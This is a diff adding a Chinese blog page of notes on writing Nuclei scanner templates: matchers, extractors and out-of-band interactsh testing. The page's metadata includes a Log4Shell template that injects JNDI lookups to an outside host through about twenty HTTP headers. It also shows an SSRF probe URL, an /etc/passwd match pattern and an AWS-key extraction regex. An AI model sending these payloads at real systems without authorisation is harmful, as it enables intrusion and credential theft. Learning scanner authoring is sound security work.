@@ -1,0 +1,1133 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Nuclei POC模板编写笔记（二） | A10ng_&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="继续摸！ 匹配器 匹配器允许对协议响应进行不同类型的灵活比较。非常易于编写，并且可以根据需要添加多个检查以实现非常有效的扫描。 类型 可以在请求中指">
+<meta name="author" content="admin">
+<link rel="canonical" href="https://a10nggg.github.io/archives/338/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://a10nggg.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://a10nggg.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://a10nggg.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://a10nggg.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://a10nggg.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://a10nggg.github.io/archives/338/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Nuclei POC模板编写笔记（二）" />
+<meta property="og:description" content="继续摸！ 匹配器 匹配器允许对协议响应进行不同类型的灵活比较。非常易于编写，并且可以根据需要添加多个检查以实现非常有效的扫描。 类型 可以在请求中指" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://a10nggg.github.io/archives/338/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-08-08T06:45:31+00:00" />
+<meta property="article:modified_time" content="2022-08-08T06:45:31+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Nuclei POC模板编写笔记（二）"/>
+<meta name="twitter:description" content="继续摸！ 匹配器 匹配器允许对协议响应进行不同类型的灵活比较。非常易于编写，并且可以根据需要添加多个检查以实现非常有效的扫描。 类型 可以在请求中指"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://a10nggg.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Nuclei POC模板编写笔记（二）",
+      "item": "https://a10nggg.github.io/archives/338/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Nuclei POC模板编写笔记（二）",
+  "name": "Nuclei POC模板编写笔记（二）",
+  "description": "继续摸！ 匹配器 匹配器允许对协议响应进行不同类型的灵活比较。非常易于编写，并且可以根据需要添加多个检查以实现非常有效的扫描。 类型 可以在请求中指",
+  "keywords": [
+    
+  ],
+  "articleBody": "继续摸！\n匹配器 匹配器允许对协议响应进行不同类型的灵活比较。非常易于编写，并且可以根据需要添加多个检查以实现非常有效的扫描。\n类型 可以在请求中指定多个匹配器。基本上有6种类型的匹配器：\nMatcher Type Part Matched status Integer Comparisons of Part size Content Length of Part word Part for a protocol regex Part for a protocol binary Part for a protocol dsl Part for a protocol 要匹配响应的状态代码，您可以使用以下语法。\nmatchers: # Match the status codes - type: status # Some status codes we want to match status: - 200 - 302 要为十六进制响应匹配二进制，您可以使用以下语法。\nmatchers: - type: binary binary: - \"504B0304\" # zip archive - \"526172211A070100\" # RAR archive version 5.0 - \"FD377A585A0000\" # xz tar.xz archive condition: or part: body 匹配器还支持将被解码和匹配的十六进制编码数据。\nmatchers: - type: word encoding: hex words: - \"50494e47\" part: body 可以根据用户的需要进一步配置Word和Regex匹配器。\ndsl类型的复杂匹配器允许使用辅助函数构建更复杂的表达式。这些功能允许访问包含基于每个协议的各种数据的协议响应。请参阅协议特定文档以了解不同的返回结果。\nmatchers: - type: dsl dsl: - \"len(body)\u003c1024 \u0026\u0026 status_code==200\" # Body length less than 1024 and 200 status code - \"contains(toupper(body), md5(cookie))\" # Check if the MD5 sum of cookies is contained in the uppercase body Response Part Description Example content_length Content-Length Header content_length \u003e= 1024 status_code Response Status Code status_code==200 all_headers Unique string containing all headers len(all_headers) body Body as string len(body) header_name Lowercase header name with - converted to _ len(user_agent) raw Headers + Response len(raw) 条件 可以在单个匹配器中指定多个单词和正则表达式，并且可以使用AND和OR等不同条件进行配置。\nAND - 使用 AND 条件允许匹配匹配器的单词列表中的所有单词。只有这样，当所有单词都匹配时，请求才会被标记为成功。 OR - 使用 OR 条件允许匹配匹配器列表中的单个单词。当匹配器匹配到一个单词时，请求将被标记为成功。 匹配部分 响应的多个部分也可以匹配请求，body如果未定义，则默认匹配部分。\n使用 AND 条件的 HTTP 响应正文的示例匹配器：\nmatchers: # Match the body word - type: word # Some words we want to match words: - \"[core]\" - \"[config]\" # Both words must be found in the response body condition: and # We want to match request body (default) part: body 负匹配器 所有类型的匹配器也支持否定条件，这在查找具有排除项的匹配时非常有用。这可以通过添加matchers块来negative: true使用。\n这是使用条件的示例语法negative，这将返回PHPSESSID响应标头中没有的所有 URL。\nmatchers: - type: word words: - \"PHPSESSID\" part: header negative: true 多个匹配器 可以在单个模板中使用多个匹配器来识别单个请求的多个条件。\n这是多个匹配器的语法示例。\nmatchers: - type: word name: php words: - \"X-Powered-By: PHP\" - \"PHPSESSID\" part: header - type: word name: node words: - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition: or part: header - type: word name: python words: - \"Python/2.\" - \"Python/3.\" condition: or part: header 匹配条件 使用多个匹配器时，默认条件是在所有匹配器之间进行 OR 操作，如果所有匹配器都返回 true，则可以使用 AND 操作确保返回结果。\nmatchers-condition: and matchers: - type: word words: - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition: or part: header - type: word words: - \"PHP\" part: body 提取器 提取器可用于从模块返回的响应中提取匹配项并将其显示在结果中。\n类型 可以在请求中指定多个提取器。截至目前，我们支持两种类型的提取器。\nregex - 根据正则表达式从响应中提取数据。 kval - 从响应标头/Cookie 中提取key: value/key=value格式化数据 json - 从基于 JSON 的响应中提取数据，使用类似 JQ 的语法。 xpath - 从 HTML 响应中提取基于 xpath 的数据 dsl - 根据 DSL 表达式从响应中提取数据。 正则表达式提取器 使用正则表达式的 HTTP 响应正文的示例提取器-\nextractors: - type: regex # type of the extractor part: body # part of the response (header,body,all) regex: - \"(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}\" # regex to use for extraction. Kval 提取器 从 HTTP 响应中提取标头的kval提取器示例。content-type\nextractors: - type: kval # type of the extractor kval: - content_type # header/cookie value to extract from response 请注意，content-type已替换为，content_type因为kval提取器不接受破折号 ( -) 作为输入，必须替换为下划线 ( _)。\nJSON 提取器 一个json提取器示例，用于id从 JSON 块中提取对象的值。\n- type: json # type of the extractor part: body name: user json: - '.[] | .id' # JQ like syntax for extraction 有关 JQ 的更多详细信息 - https://github.com/stedolan/jq\nXpath 提取器 从 HTML 响应中提取属性值的xpath提取器示例。href\nextractors: - type: xpath # type of the extractor attribute: href # attribute value to extract (optional) xpath: - \"/html/body/div/p[2]/a\" # xpath value for extraction 通过在浏览器中进行简单的复制粘贴，我们可以从任何网页内容中获取xpath值。\nDSL 提取器 一个dsl提取器示例，用于通过HTTP 响应中的辅助函数提取有效body长度。len\nextractors: - type: dsl # type of the extractor dsl: - \"len(body)\" # dsl expression value to extract from response 动态提取器 在编写多请求模板时，提取器可用于在运行时捕获动态值。CSRF Tokens、Session Headers 等可以被提取并在请求中使用。此功能仅适用于 RAW 请求格式。\n使用名称定义动态提取器的示例，该提取器api将从请求中捕获基于正则表达式的模式。\nextractors: - type: regex name: api part: body internal: true # Required for using dynamic variables regex: - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" 提取的值存储在变量api中，可以在后续请求的任何部分中使用。\n如果要将提取器用作动态变量，则必须使用internal: true以避免在终端中打印提取的值。\n还可以为正则表达式指定可选的正则表达式匹配组以进行更复杂的匹配。\nextractors: - type: regex # type of extractor name: csrf_token # defining the variable name part: body # part of response to look for # group defines the matching group being used. # In GO the \"match\" is the full array of all matches and submatches # match[0] is the full match # match[n] is the submatches. Most often we'd want match[1] as depicted below group: 1 regex: - '' 上面带有名称的提取器csrf_token将保存由([[:alnum:]]{16})as提取的值abcdefgh12345678。\n如果此正则表达式未提供组选项，则上述名称提取器csrf_html_tag将完整匹配（by ）作为.\nOOB 测试 自Nuclei v2.3.6发布以来，Nuclei 支持使用interact.sh API 来实现基于 OOB 的漏洞扫描，并内置了自动请求关联。就像{{interactsh-url}} 在请求中的任何地方编写一样简单，并为interact_protocol. Nuclei 将处理交互与模板的相关性以及它通过允许轻松的 OOB 扫描而生成的请求。\nInteractsh 占位符 {{interactsh-url}}http和网络请求中支持占位符。\n{{interactsh-url}}下面提供了一个带有占位符的核请求示例。这些在运行时被替换为唯一的 interact.sh URL。\n- raw: - | GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1 Host: {{Hostname}} Interactsh 匹配器 Interactsh 交互可以与word，regex或dsl使用以下部分的匹配器/提取器一起使用。\npart interactsh_protocol interactsh_request interactsh_response interactsh_protocol 值可以是 dns、http 或 smtp。这是每个基于interactsh的模板的标准匹配器，dns通常是通用值，因为它本质上是非侵入性的。\ninteractsh_request interact.sh 服务器收到的请求。\ninteractsh_response interact.sh 服务器发送给客户端的响应。\nInteractsh DNS 交互匹配器示例：\nmatchers: - type: word part: interactsh_protocol # Confirms the DNS Interaction words: - \"dns\" 交互内容上的 HTTP 交互匹配器 + 单词匹配器示例\nmatchers-condition: and matchers: - type: word part: interactsh_protocol # Confirms the HTTP Interaction words: - \"http\" - type: regex part: interactsh_request # Confirms the retrieval of etc/passwd file regex: - \"root:[x*]:0:0:\" 之前在github找的一个log4j2扫描模板就用到了这个。\nid: log4j-fuzz-head-poc info: name: log4j-rce漏洞 author: xxx severity: critical tags: apache,rce requests: - raw: - | GET / HTTP/1.1 Host: {{Hostname}} {{log4j_payloads}} - | POST / HTTP/1.1 Host: {{Hostname}} {{log4j_payloads}} payloads: log4j_payloads: - 'X-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}' - 'X-Remote-IP: ${jndi:ldap://{{interactsh-url}}/info}' - 'X-Remote-Addr: ${jndi:ldap://{{interactsh-url}}/info}' - 'X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/info}' - 'X-Originating-IP: ${jndi:ldap://{{interactsh-url}}/info}' - 'User-Agent: ${jndi:ldap://{{interactsh-url}}/info}' - 'Referer: ${jndi:ldap://{{interactsh-url}}/info}' - 'CF-Connecting_IP: ${jndi:ldap://{{interactsh-url}}/info}' - 'True-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}' - 'X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/info}' - 'Originating-IP: ${jndi:ldap://{{interactsh-url}}/info}' - 'X-Real-IP: ${jndi:ldap://{{interactsh-url}}/info}' - 'X-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}' - 'Forwarded: ${jndi:ldap://{{interactsh-url}}/info}' - 'Client-IP: ${jndi:ldap://{{interactsh-url}}/info}' - 'Contact: ${jndi:ldap://{{interactsh-url}}/info}' - 'X-Wap-Profile: ${jndi:ldap://{{interactsh-url}}/info}' - 'X-Api-Version: ${jndi:ldap://{{interactsh-url}}/info}' - 'Host: ${jndi:ldap://{{interactsh-url}}/info}' attack: clusterbomb matchers-condition: or matchers: - type: word part: interactsh_protocol name: http words: - \"http\" - type: word part: interactsh_protocol name: dns words: - \"dns\" 辅助函数 辅助函数 以下是可在 RAW 请求/网络请求中使用的所有支持的辅助函数的列表。\n太多了记不住，cv一下。。。\nHelper function Description Example Output base64(src interface{}) string Base64 对字符串进行编码 base64(\"Hello\") SGVsbG8= base64_decode(src interface{}) []byte Base64 对字符串进行解码 base64_decode(\"SGVsbG8=\") Hello base64_py(src interface{}) string 像 python 一样将字符串编码为 base64（带有新行） base64_py(\"Hello\") SGVsbG8= concat(arguments …interface{}) string 连接给定数量的参数以形成一个字符串 concat(\"Hello\", 123, \"world) Hello123world compare_versions(versionToCheck string, constraints …string) bool 将第一个版本参数与提供的约束进行比较 compare_versions(\u0026#039;v1.0.0\u0026#039;, \u0026#039;\u003ev0.0.1\u0026#039;, \u0026#039;",
+  "wordCount" : "5060",
+  "inLanguage": "en",
+  "datePublished": "2022-08-08T06:45:31Z",
+  "dateModified": "2022-08-08T06:45:31Z",
+  "author":{
+    "@type": "Person",
+    "name": "admin"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://a10nggg.github.io/archives/338/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "A10ng_'s Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://a10nggg.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://a10nggg.github.io/" accesskey="h" title="A10ng_&#39;s Blog (Alt + H)">A10ng_&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://a10nggg.github.io/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/posts/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Nuclei POC模板编写笔记（二）
+    </h1>
+    <div class="post-meta"><span title='2022-08-08 06:45:31 +0000 +0000'>August 8, 2022</span>&nbsp;·&nbsp;admin
+
+</div>
+  </header> 
+  <div class="post-content"><p>继续摸！</p>
+<h3 id="匹配器">匹配器<a hidden class="anchor" aria-hidden="true" href="#匹配器">#</a></h3>
+<p>匹配器允许对协议响应进行不同类型的灵活比较。非常易于编写，并且可以根据需要添加多个检查以实现非常有效的扫描。</p>
+<h4 id="类型">类型<a hidden class="anchor" aria-hidden="true" href="#类型">#</a></h4>
+<p>可以在请求中指定多个匹配器。基本上有6种类型的匹配器：</p>
+<table>
+<thead>
+<tr>
+<th>Matcher Type</th>
+<th>Part Matched</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>status</td>
+<td>Integer Comparisons of Part</td>
+</tr>
+<tr>
+<td>size</td>
+<td>Content Length of Part</td>
+</tr>
+<tr>
+<td>word</td>
+<td>Part for a protocol</td>
+</tr>
+<tr>
+<td>regex</td>
+<td>Part for a protocol</td>
+</tr>
+<tr>
+<td>binary</td>
+<td>Part for a protocol</td>
+</tr>
+<tr>
+<td>dsl</td>
+<td>Part for a protocol</td>
+</tr>
+</tbody>
+</table>
+<p>要匹配响应的状态代码，您可以使用以下语法。</p>
+<pre><code class="language-yaml">matchers:
+  # Match the status codes
+  - type: status
+    # Some status codes we want to match
+    status:
+      - 200
+      - 302</code></pre>
+<p>要为十六进制响应匹配二进制，您可以使用以下语法。</p>
+<pre><code class="language-yaml">matchers:
+  - type: binary
+    binary:
+      - "504B0304" # zip archive
+      - "526172211A070100" # RAR archive version 5.0
+      - "FD377A585A0000" # xz tar.xz archive
+    condition: or
+    part: body</code></pre>
+<p>匹配器还支持将被解码和匹配的十六进制编码数据。</p>
+<pre><code class="language-yaml">matchers:
+  - type: word
+    encoding: hex
+    words:
+      - "50494e47"
+    part: body</code></pre>
+<p>可以根据用户的需要进一步配置Word和<strong>Regex匹配器。</strong></p>
+<p><strong>dsl</strong>类型的复杂匹配器允许使用辅助函数构建更复杂的表达式。这些功能允许访问包含基于每个协议的各种数据的协议响应。请参阅协议特定文档以了解不同的返回结果。</p>
+<pre><code class="language-yaml">matchers:
+  - type: dsl
+    dsl:
+      - "len(body)&lt;1024 && status_code==200" # Body length less than 1024 and 200 status code
+      - "contains(toupper(body), md5(cookie))" # Check if the MD5 sum of cookies is contained in the uppercase body</code></pre>
+<table>
+<thead>
+<tr>
+<th>Response Part</th>
+<th>Description</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>content_length</td>
+<td>Content-Length Header</td>
+<td>content_length &gt;= 1024</td>
+</tr>
+<tr>
+<td>status_code</td>
+<td>Response Status Code</td>
+<td>status_code==200</td>
+</tr>
+<tr>
+<td>all_headers</td>
+<td>Unique string containing all headers</td>
+<td>len(all_headers)</td>
+</tr>
+<tr>
+<td>body</td>
+<td>Body as string</td>
+<td>len(body)</td>
+</tr>
+<tr>
+<td>header_name</td>
+<td>Lowercase header name with <code>-</code> converted to <code>_</code></td>
+<td>len(user_agent)</td>
+</tr>
+<tr>
+<td>raw</td>
+<td>Headers + Response</td>
+<td>len(raw)</td>
+</tr>
+</tbody>
+</table>
+<h4 id="条件">条件<a hidden class="anchor" aria-hidden="true" href="#条件">#</a></h4>
+<p>可以在单个匹配器中指定多个单词和正则表达式，并且可以使用<strong>AND</strong>和<strong>OR</strong>等不同条件进行配置。</p>
+<ol>
+<li><strong>AND</strong> - 使用 AND 条件允许匹配匹配器的单词列表中的所有单词。只有这样，当所有单词都匹配时，请求才会被标记为成功。</li>
+<li><strong>OR</strong> - 使用 OR 条件允许匹配匹配器列表中的单个单词。当匹配器匹配到一个单词时，请求将被标记为成功。</li>
+</ol>
+<h4 id="匹配部分">匹配部分<a hidden class="anchor" aria-hidden="true" href="#匹配部分">#</a></h4>
+<p>响应的多个部分也可以匹配请求，<code>body</code>如果未定义，则默认匹配部分。</p>
+<p>使用 AND 条件的 HTTP 响应正文的示例匹配器：</p>
+<pre><code class="language-yaml">matchers:
+  # Match the body word
+  - type: word
+   # Some words we want to match
+   words:
+     - "[core]"
+     - "[config]"
+   # Both words must be found in the response body
+   condition: and
+   #  We want to match request body (default)
+   part: body</code></pre>
+<h4 id="负匹配器">负匹配器<a hidden class="anchor" aria-hidden="true" href="#负匹配器">#</a></h4>
+<p>所有类型的匹配器也支持否定条件，这在查找具有排除项的匹配时非常有用。这可以通过添加matchers块来<code>negative: true</code>使用。</p>
+<p>这是使用条件的示例语法<code>negative</code>，这将返回<code>PHPSESSID</code>响应标头中没有的所有 URL。</p>
+<pre><code class="language-yaml">matchers:
+  - type: word
+    words:
+      - "PHPSESSID"
+    part: header
+    negative: true</code></pre>
+<h4 id="多个匹配器">多个匹配器<a hidden class="anchor" aria-hidden="true" href="#多个匹配器">#</a></h4>
+<p>可以在单个模板中使用多个匹配器来识别单个请求的多个条件。</p>
+<p>这是多个匹配器的语法示例。</p>
+<pre><code class="language-yaml">matchers:
+  - type: word
+    name: php
+    words:
+      - "X-Powered-By: PHP"
+      - "PHPSESSID"
+    part: header
+  - type: word
+    name: node
+    words:
+      - "Server: NodeJS"
+      - "X-Powered-By: nodejs"
+    condition: or
+    part: header
+  - type: word
+    name: python
+    words:
+      - "Python/2."
+      - "Python/3."
+    condition: or
+    part: header</code></pre>
+<h4 id="匹配条件">匹配条件<a hidden class="anchor" aria-hidden="true" href="#匹配条件">#</a></h4>
+<p>使用多个匹配器时，默认条件是在所有匹配器之间进行 OR 操作，如果所有匹配器都返回 true，则可以使用 AND 操作确保返回结果。</p>
+<pre><code class="language-yaml">    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "X-Powered-By: PHP"
+          - "PHPSESSID"
+        condition: or
+        part: header
+
+      - type: word
+        words:
+          - "PHP"
+        part: body</code></pre>
+<h3 id="提取器">提取器<a hidden class="anchor" aria-hidden="true" href="#提取器">#</a></h3>
+<p>提取器可用于从模块返回的响应中提取匹配项并将其显示在结果中。</p>
+<h4 id="类型-1">类型<a hidden class="anchor" aria-hidden="true" href="#类型-1">#</a></h4>
+<p>可以在请求中指定多个提取器。截至目前，我们支持两种类型的提取器。</p>
+<ol>
+<li><strong>regex</strong> - 根据正则表达式从响应中提取数据。</li>
+<li><strong>kval</strong> - 从响应标头/Cookie 中提取<code>key: value</code>/<code>key=value</code>格式化数据</li>
+<li><strong>json</strong> - 从基于 JSON 的响应中提取数据，使用类似 JQ 的语法。</li>
+<li><strong>xpath</strong> - 从 HTML 响应中提取基于 xpath 的数据</li>
+<li><strong>dsl</strong> - 根据 DSL 表达式从响应中提取数据。</li>
+</ol>
+<h4 id="正则表达式提取器">正则表达式提取器<a hidden class="anchor" aria-hidden="true" href="#正则表达式提取器">#</a></h4>
+<p><strong>使用正则表达式</strong>的 HTTP 响应正文的示例提取器-</p>
+<pre><code class="language-yaml">extractors:
+  - type: regex # type of the extractor
+    part: body  # part of the response (header,body,all)
+    regex:
+      - "(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}"  # regex to use for extraction.</code></pre>
+<h4 id="kval-提取器">Kval 提取器<a hidden class="anchor" aria-hidden="true" href="#kval-提取器">#</a></h4>
+<p>从 HTTP 响应中提取标头的<strong>kval</strong>提取器示例。<code>content-type</code></p>
+<pre><code class="language-yaml">extractors:
+      - type: kval  # type of the extractor
+        kval:
+          - content_type  # header/cookie value to extract from response</code></pre>
+<p>请注意，<code>content-type</code>已替换为，<code>content_type</code>因为<strong>kval</strong>提取器不接受破折号 ( <code>-</code>) 作为输入，必须替换为下划线 ( <code>_</code>)。</p>
+<h4 id="json-提取器">JSON 提取器<a hidden class="anchor" aria-hidden="true" href="#json-提取器">#</a></h4>
+<p>一个<strong>json</strong>提取器示例，用于<code>id</code>从 JSON 块中提取对象的值。</p>
+<pre><code class="language-yaml">      - type: json # type of the extractor
+        part: body
+        name: user
+        json:
+          - &#039;.[] | .id&#039;  # JQ like syntax for extraction</code></pre>
+<p>有关 JQ 的更多详细信息 - <a href="https://github.com/stedolan/jq">https://github.com/stedolan/jq</a></p>
+<h4 id="xpath-提取器">Xpath 提取器<a hidden class="anchor" aria-hidden="true" href="#xpath-提取器">#</a></h4>
+<p>从 HTML 响应中提取属性值的<strong>xpath</strong>提取器示例。<code>href</code></p>
+<pre><code class="language-yaml">    extractors:
+      - type: xpath # type of the extractor
+        attribute: href # attribute value to extract (optional)
+        xpath:
+          - "/html/body/div/p[2]/a"  # xpath value for extraction</code></pre>
+<p>通过在浏览器中进行简单的<a href="https://www.scientecheasy.com/2020/07/find-xpath-chrome.html/">复制粘贴</a>，我们可以从任何网页内容中获取<strong>xpath值。</strong></p>
+<h4 id="dsl-提取器">DSL 提取器<a hidden class="anchor" aria-hidden="true" href="#dsl-提取器">#</a></h4>
+<p>一个<strong>dsl</strong>提取器示例，用于通过HTTP 响应中的辅助函数提取有效<code>body</code>长度。<code>len</code></p>
+<pre><code class="language-yaml">extractors:
+      - type: dsl  # type of the extractor
+        dsl:
+          - "len(body)"  # dsl expression value to extract from response</code></pre>
+<h4 id="动态提取器">动态提取器<a hidden class="anchor" aria-hidden="true" href="#动态提取器">#</a></h4>
+<p>在编写多请求模板时，提取器可用于在运行时捕获动态值。CSRF Tokens、Session Headers 等可以被提取并在请求中使用。此功能仅适用于 RAW 请求格式。</p>
+<p>使用名称定义动态提取器的示例，该提取器<code>api</code>将从请求中捕获基于正则表达式的模式。</p>
+<pre><code class="language-yaml">    extractors:
+      - type: regex
+        name: api
+        part: body
+        internal: true # Required for using dynamic variables
+        regex:
+          - "(?m)[0-9]{3,10}\\.[0-9]+"</code></pre>
+<p>提取的值存储在变量<strong>api</strong>中，可以在后续请求的任何部分中使用。</p>
+<p>如果要将提取器用作动态变量，则必须使用<code>internal: true</code>以避免在终端中打印提取的值。</p>
+<p>还可以为正则表达式指定可选的正则表达式<strong>匹配组以进行更复杂的匹配。</strong></p>
+<pre><code class="language-yaml">extractors:
+  - type: regex  # type of extractor
+    name: csrf_token # defining the variable name
+    part: body # part of response to look for
+    # group defines the matching group being used. 
+    # In GO the "match" is the full array of all matches and submatches 
+    # match[0] is the full match
+    # match[n] is the submatches. Most often we&#039;d want match[1] as depicted below
+    group: 1
+    regex:
+      - &#039;&lt;input\sname="csrf_token"\stype="hidden"\svalue="([[:alnum:]]{16})"\s/&gt;&#039;</code></pre>
+<p>上面带有名称的提取器<code>csrf_token</code>将保存由<code>([[:alnum:]]{16})</code>as提取的值<code>abcdefgh12345678</code>。</p>
+<p>如果此正则表达式未提供组选项，则上述名称提取器<code>csrf_html_tag</code>将完整匹配（by <code>&lt;input name=&quot;csrf_token&quot;\stype=&quot;hidden&quot;\svalue=&quot;([[:alnum:]]{16})&quot; /&gt;</code>）作为<code>&lt;input name=&quot;csrf_token&quot; type=&quot;hidden&quot; value=&quot;abcdefgh12345678&quot; /&gt;</code>.</p>
+<h3 id="oob-测试">OOB 测试<a hidden class="anchor" aria-hidden="true" href="#oob-测试">#</a></h3>
+<p>自<a href="https://github.com/projectdiscovery/nuclei/releases/tag/v2.3.6">Nuclei v2.3.6</a>发布以来，Nuclei 支持使用<a href="https://github.com/projectdiscovery/interactsh">interact.sh</a> API 来实现基于 OOB 的漏洞扫描，并内置了自动请求关联。就像<code>{{interactsh-url}}</code> 在请求中的任何地方编写一样简单，并为<code>interact_protocol</code>. Nuclei 将处理交互与模板的相关性以及它通过允许轻松的 OOB 扫描而生成的请求。</p>
+<h4 id="interactsh-占位符">Interactsh 占位符<a hidden class="anchor" aria-hidden="true" href="#interactsh-占位符">#</a></h4>
+<p><code>{{interactsh-url}}</code><strong>http</strong>和<strong>网络</strong>请求中支持占位符。</p>
+<p><code>{{interactsh-url}}</code>下面提供了一个带有占位符的核请求示例。这些在运行时被替换为唯一的 interact.sh URL。</p>
+<pre><code>  - raw:
+      - |
+        GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+</code></pre>
+<h4 id="interactsh-匹配器">Interactsh 匹配器<a hidden class="anchor" aria-hidden="true" href="#interactsh-匹配器">#</a></h4>
+<p>Interactsh 交互可以与<code>word</code>，<code>regex</code>或<code>dsl</code>使用以下部分的匹配器/提取器一起使用。</p>
+<table>
+<thead>
+<tr>
+<th>part</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>interactsh_protocol</td>
+</tr>
+<tr>
+<td>interactsh_request</td>
+</tr>
+<tr>
+<td>interactsh_response</td>
+</tr>
+</tbody>
+</table>
+<h5 id="interactsh_protocol">interactsh_protocol<a hidden class="anchor" aria-hidden="true" href="#interactsh_protocol">#</a></h5>
+<p>值可以是 dns、http 或 smtp。这是每个基于interactsh的模板的标准匹配器，dns通常是通用值，因为它本质上是非侵入性的。</p>
+<h5 id="interactsh_request">interactsh_request<a hidden class="anchor" aria-hidden="true" href="#interactsh_request">#</a></h5>
+<p>interact.sh 服务器收到的请求。</p>
